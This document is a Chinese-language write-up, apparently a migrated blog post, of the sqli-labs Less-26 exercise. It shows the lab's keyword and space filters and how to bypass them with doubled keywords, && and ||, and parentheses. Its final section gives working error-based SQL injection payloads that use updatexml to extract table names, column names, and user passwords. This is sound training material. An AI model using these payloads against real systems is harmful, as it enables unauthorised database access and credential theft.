@@ -1,0 +1,39 @@
+<hr>
+<h2 id="title-less26url-https-www-yuque-com-u29002979-ep2zrx-vgqq95ls3mgqam0t"><a href="#title-less26url-https-www-yuque-com-u29002979-ep2zrx-vgqq95ls3mgqam0t" class="headerlink" title="title: less26url: https://www.yuque.com/u29002979/ep2zrx/vgqq95ls3mgqam0t"></a>title: less26<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/vgqq95ls3mgqam0t">https://www.yuque.com/u29002979/ep2zrx/vgqq95ls3mgqam0t</a></h2><pre><code class="bash">$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+
+$id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);			 //strip out OR (non case sensitive)
+$id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id);		 //Strip out AND (non case sensitive)
+$id= preg_replace(&#39;/[\/*]/&#39;,&quot;&quot;, $id);	 //strip out /*
+$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);		 //Strip out --
+$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);			 //Strip out #
+$id= preg_replace(&#39;/[\s]/&#39;,&quot;&quot;, $id);		 //Strip out spaces空格和换行
+$id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id); //Strip out slashes/\\\
+</code></pre>
+<p>字符型注入，单引号闭合**’**</p>
+<blockquote>
+<p><strong>\s过滤了空格和换行，</strong><br><strong>解决and or可以双写或者用&amp;&amp;和||代替，</strong><br><strong>解决注释需要强行闭合逃逸，</strong><br><strong>需要空格的地方可以加上括号()或加号+</strong><br>and or ——&gt; &amp;&amp; ||</p>
+<h1 id="–-——-gt-闭合逃逸"><a href="#–-——-gt-闭合逃逸" class="headerlink" title="–     ——&gt; 闭合逃逸"></a>–     ——&gt; 闭合逃逸</h1><p>&#x2F;s空格        ——&gt; 括号</p>
+</blockquote>
+<blockquote>
+<p>All You Spaces and Comments belong to us.</p>
+</blockquote>
+<p>提示<strong>空格,and,注释</strong>被过滤 <a name="y70Tw"></a></p>
+<h2 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h2><p><code>1&#39;</code></p>
+<blockquote>
+<p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-26\index.php</strong> on line <strong>36</strong><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p>
+</blockquote>
+<ol>
+<li>单引号闭合’</li>
+<li>网站没有对报错信息进行过滤，我们可以使用基于报错的注入手段</li>
+</ol>
+<p><code>1 and 1=1 --+</code></p>
+<blockquote>
+<p>Hint: Your Input is Filtered with following result: 11&#x3D;1</p>
+</blockquote>
+<p>发现and,空格和注释符号被过滤掉了</p>
+<p><a name="vzgqw"></a></p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p><a name="Kcozu"></a></p>
+<h2 id="爆破数据库名称"><a href="#爆破数据库名称" class="headerlink" title="爆破数据库名称"></a>爆破数据库名称</h2><p><code>-1&#39;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||&#39;</code> <a name="Pain7"></a></p>
+<h2 id="爆破数据表名称"><a href="#爆破数据表名称" class="headerlink" title="爆破数据表名称"></a>爆破数据表名称</h2><p><code>-1&#39;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),0x7e),1)||&#39;</code> <a name="LKNid"></a></p>
+<h2 id="爆破字段名"><a href="#爆破字段名" class="headerlink" title="爆破字段名"></a>爆破字段名</h2><p><code>-1&#39;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database()aandnd(table_name=&#39;users&#39;))),0x7e),1)||&#39;</code> <a name="Clssj"></a></p>
+<h2 id="爆破字段内容"><a href="#爆破字段内容" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h2><p><code>-1&#39;||updatexml(1,concat(0x7e,(select(group_concat(username,0x7e,passwoorrd))from(users)),0x7e),1)||&#39;</code></p>
